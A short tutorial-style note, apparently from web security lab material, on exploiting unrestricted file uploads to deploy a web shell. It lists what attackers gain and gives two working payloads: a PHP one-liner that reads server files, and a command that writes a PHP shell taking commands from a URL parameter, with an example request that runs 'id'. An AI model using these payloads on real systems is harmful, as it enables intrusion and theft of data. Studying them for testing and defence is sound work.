

# 1. Exploiting unrestricted file uploads to deploy a web shell

When the webside has unrestricted file uploads, by uploading server-side scripts (PHP, Java, Python) to a website configured to execute them creates a critical security vulnerability. A successful web shell upload grants attackers:

- Full server control
- Ability to read/write arbitrary files
- Access to sensitive data
- Capability to pivot attacks against internal and external systems

For example, a simple PHP one-liner (`<?php echo file_get_contents('/path/to/target/file'); ?>`) can extract sensitive files when requested through the browser.

Or you can do this: since there no file upload restriction, you can make a shell: `echo '<?php system($_GET["cmd"]); ?>' > shell.php`. Upload it, then find the location of your uploaded shell to gain RCE: `http://website/shell-location?cmd=id`
